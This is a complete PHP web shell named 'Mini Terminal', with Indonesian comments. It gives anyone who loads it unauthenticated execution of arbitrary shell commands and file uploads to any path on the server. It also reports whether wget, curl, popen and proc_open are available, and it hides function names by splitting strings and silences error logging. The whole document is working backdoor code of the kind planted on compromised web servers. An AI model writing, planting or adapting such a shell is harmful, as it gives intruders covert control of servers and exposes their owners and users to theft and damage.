<?php
@ini_set('log_errors', 0);
@ini_set('display_errors', 1);
@error_reporting(E_ALL);
while(@ob_end_clean());

$f = 'move' . '_uploaded_' . 'file';
$g = 'get' . 'cwd';
$d = empty($_POST['x1']) ? '' : $_POST['x1'];
$w = empty($_POST['x2']) ? $g() : $_POST['x2'];
$u = $_SERVER['REQUEST_URI'];
$s = '';

// --- FUNGSI TAMBAHAN UNTUK CEK COMMAND/VERSION ---
function get_cmd_version($cmd) {
    if (function_exists('shell_exec')) {
        $result = @shell_exec($cmd . ' --version 2>&1');
        if ($result === null || $result === false) {
            return '<span style="color:red;">OFF</span>';
        }
        $lines = explode("\n", trim($result));
        if (empty($lines[0])) {
             return '<span style="color:red;">OFF</span>';
        }
        foreach ($lines as $line) {
            $line = trim($line);
            if (stripos($line, 'version') !== false) {
                $v = htmlspecialchars(substr($line, 0, 25));
                return '<span style="color:lime;">ON ('.$v.')</span>';
            }
        }
        return '<span style="color:lime;">ON</span>';
    } else {
        return '<span style="color:red;">BLOCKED</span>';
    }
}

$os = php_uname('s') . ' ' . php_uname('r');
$server_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'N/A';
$wget_info = get_cmd_version('wget');
$curl_info = get_cmd_version('curl');
$popen_status = function_exists('popen') ? '<span style="color:lime;">ON</span>' : '<span style="color:red;">OFF</span>';
$proc_open_status = function_exists('proc_open') ? '<span style="color:lime;">ON</span>' : '<span style="color:red;">OFF</span>';

if (isset($_FILES['f1']) && $_FILES['f1']['error'] === UPLOAD_ERR_OK) {
  $t = $w . '/' . basename($_FILES['f1']['name']);
  if ($f($_FILES['f1']['tmp_name'], $t)) {
    $s .= "[+] Uploaded: $t (" . $_FILES['f1']['size'] . " bytes)\n";
  }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mini Terminal</title>
    <style>
        /* Desain Kaku & Minimalis (Anti Bug) */
        body {
            background-color: #000;
            color: #0f0;
            font-family: monospace;
            font-size: 13px;
            padding: 10px;
            margin: 0;
        }
        .box {
            border: 1px solid #333;
            padding: 10px;
            margin-bottom: 10px;
            background-color: #0a0a0a;
        }
        .info-row {
            margin-bottom: 5px;
            border-bottom: 1px dotted #222;
            padding-bottom: 3px;
        }
        .label { color: #888; display: inline-block; width: 80px; }
        input[type="text"] {
            width: 100%;
            background: #000;
            color: #0f0;
            border: 1px solid #333;
            padding: 8px;
            font-family: monospace;
            margin-bottom: 10px;
            box-sizing: border-box;
        }
        input[type="text"]:focus {
            border-color: #0f0;
            outline: none;
        }
        input[type="file"] {
            color: #888;
            margin-bottom: 10px;
        }
        button {
            background: #000;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 8px 15px;
            font-family: monospace;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
        }
        button:hover {
            background: #0f0;
            color: #000;
        }
        pre {
            background: #000;
            border: 1px solid #333;
            padding: 10px;
            white-space: pre-wrap;
            word-wrap: break-word;
            min-height: 100px;
            margin: 0;
            color: #ccc;
        }
    </style>
</head>
<body>

    <!-- SYSTEM INFO -->
    <div class="box">
        <div class="info-row"><span class="label">OS</span> : <?= htmlspecialchars($os) ?></div>
        <div class="info-row"><span class="label">IP Server</span> : <?= htmlspecialchars($server_ip) ?></div>
        <div class="info-row"><span class="label">Wget</span> : <?= $wget_info ?></div>
        <div class="info-row"><span class="label">Curl</span> : <?= $curl_info ?></div>
        <div class="info-row"><span class="label">Popen</span> : <?= $popen_status ?></div>
        <div class="info-row" style="border:none;"><span class="label">proc_open</span> : <?= $proc_open_status ?></div>
    </div>

    <!-- FORM -->
    <form method="post" action="<?php echo $u; ?>" enctype="multipart/form-data">
        <div class="box">
            <div class="label">Path :</div>
            <input type="text" name="x2" value="<?php echo htmlspecialchars($w); ?>">
            
            <div class="label">File :</div>
            <input type="file" name="f1">
            
            <div class="label">Cmd :</div>
            <input type="text" name="x1" value="<?php echo htmlspecialchars($d); ?>" placeholder=">_ ketik perintah..." autocomplete="off">
            
            <button type="submit">EKSEKUSI</button>
        </div>
    </form>

    <!-- OUTPUT -->
    <div class="box">
        <div class="label" style="margin-bottom: 5px; display:block;">Output :</div>
        <pre><?php
        echo htmlspecialchars($s);
        if (!empty($d)) {
          $full_cmd = (DIRECTORY_SEPARATOR === '/' ? 'exec 2>&1; ' : 'cmd /C "') . $d . (DIRECTORY_SEPARATOR !== '/' ? '"' : '');
          
          echo "\n> $d\n";
          echo "----------------\n";

          if (function_exists('proc_open')) {
              $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
              $process = @proc_open($full_cmd, $descriptorspec, $pipes);
              if (is_resource($process)) {
                  echo htmlspecialchars(@stream_get_contents($pipes[1]));
                  echo htmlspecialchars(@stream_get_contents($pipes[2]));
                  @fclose($pipes[0]); @fclose($pipes[1]); @fclose($pipes[2]);
                  @proc_close($process);
              } else {
                  echo "[-] Gagal eksekusi (proc_open error)\n";
              }
          } elseif (function_exists('popen')) {
              $p = @popen($full_cmd, 'r');
              if ($p) {
                  while (!feof($p)) echo htmlspecialchars(@fread($p, 4096));
                  @pclose($p);
              } else {
                  echo "[-] Gagal eksekusi (popen error)\n";
              }
          } else {
              echo "[-] Semua fungsi eksekusi diblokir!\n";
          }
        }
        ?></pre>
    </div>

</body>
</html>
